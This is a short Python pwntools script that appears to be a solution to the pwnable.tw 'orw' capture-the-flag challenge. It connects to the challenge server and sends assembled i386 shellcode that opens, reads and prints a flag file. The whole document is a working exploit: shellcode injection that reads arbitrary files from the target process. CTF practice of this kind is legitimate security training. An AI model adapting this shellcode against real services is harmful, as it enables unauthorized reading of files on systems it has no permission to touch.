from pwn import *

context(arch='i386', os='linux')

fd = remote("chall.pwnable.tw", 10001)
print util.proc.pidof(fd)
pause()

shellcode = ""
shellcode += shellcraft.open("/home/orw/flag") #guessing prob lol
shellcode += shellcraft.read(3, 'esp', 50)
shellcode += shellcraft.write(1, 'esp', 50)

fd.recv()
fd.send(asm(shellcode))
print fd.recv()
